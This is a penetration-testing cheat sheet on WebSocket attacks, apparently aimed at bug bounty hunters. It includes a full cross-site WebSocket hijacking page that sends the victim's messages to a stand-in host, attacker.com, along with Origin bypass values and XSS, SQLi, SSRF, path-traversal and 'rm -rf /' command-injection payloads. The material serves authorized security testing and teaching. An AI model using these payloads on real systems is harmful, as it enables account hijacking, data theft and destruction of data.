# WebSocket Attack Techniques

## Cross-Site WebSocket Hijacking (CSWSH)

The browser's same-origin policy does NOT apply to WebSocket handshakes. Any origin can initiate a WS connection. Cookies are sent automatically. If Origin is not validated → CSWSH is possible.

### Attack Flow
```
1. Victim logged into target.com
2. Victim visits evil.com
3. evil.com's JavaScript opens WebSocket to wss://target.com/ws
4. Browser includes victim's cookies in the handshake
5. Target accepts the connection (Origin not validated)
6. evil.com's JavaScript can now send/receive messages AS the victim
```

### Exploitation Code (Host on Attacker Domain)
```html
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = () => {
  // Send arbitrary commands as the victim
  ws.send(JSON.stringify({action: 'getUserData'}));
  ws.send(JSON.stringify({action: 'listMessages'}));
};

ws.onmessage = (event) => {
  // Exfiltrate victim's private messages to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: event.data
  });
};

ws.onerror = (e) => console.log('WS error:', e);
</script>
</body>
</html>
```

### Origin Validation Tests
```
Normal:       Origin: https://target.com
Bypass tries: Origin: https://evil.com
              Origin: https://evil-target.com
              Origin: https://target.com.evil.com
              Origin: null
              (Origin header omitted)
```

If ANY of these result in a successful 101 Switching Protocols response → vulnerable.

## Authentication Placement Issues

### Token in URL (Insecure)
```
wss://target.com/ws?token=JWT_HERE
```
Problems:
- Tokens appear in web server logs
- Tokens leak via Referer headers
- Tokens visible in URL history
- Tokens accessible via `window.location` to any script

### Auth Only at Handshake (No Per-Message Auth)
If authentication is validated once at connection and never again:
- After CSWSH, attacker can send arbitrary messages for the duration
- Privilege changes (admin demotion) don't affect active connections
- Session invalidation (logout) may not close the WebSocket

## Message Injection

WebSocket messages are request parameters. Test them for all the vulnerability classes you'd test HTTP parameters for:

### XSS via WebSocket Messages
```javascript
// Chat application:
// User sends: {"type": "message", "content": "Hello"}
// Server broadcasts: {"from": "alice", "content": "Hello"}
// Client renders: chatWindow.innerHTML += `<div>${msg.content}</div>`

// Attack payload:
{"type": "message", "content": "<img src=x onerror=alert(1)>"}
// Renders as HTML → XSS affecting all users
```

### Injection via Message Parameters
```javascript
// SQLi through search message
{"type": "search", "query": "' OR 1=1-- -"}

// SSRF through URL message
{"type": "fetch", "url": "http://169.254.169.254/latest/meta-data/"}

// Command injection through filename message
{"type": "upload", "filename": "test.png; rm -rf /"}

// Path traversal through file message
{"type": "read_file", "path": "../../../etc/passwd"}
```

### Authorization Bypass via Channel Subscription
```javascript
// Send: {"type": "subscribe", "channel": "user-12345-private"}
// If channel name is trusted from the client → subscribe to any user's private feed

// Send: {"type": "subscribe", "channel": "admin-events"}
// If admin channel not restricted → receive admin notifications
```

## Command Confusion

If WebSocket protocol is complex with multiple message types, try unexpected combinations:
```javascript
// Mix types
{"type": "user_action", "admin_command": "reset_all"}

// Unexpected type values
{"type": 1}
{"type": true}
{"type": {"nested": "object"}}
{"type": "__proto__"}
```

## DoS via Expensive Operations

```javascript
// If server processes each message fully before rate limiting:
for (let i = 0; i < 10000; i++) {
  ws.send(JSON.stringify({type: "expensive_query", filter: {...complex...}}));
}
```

NOTE: Most bug bounty programs don't reward DoS. Test carefully and only report if it enables a larger attack.
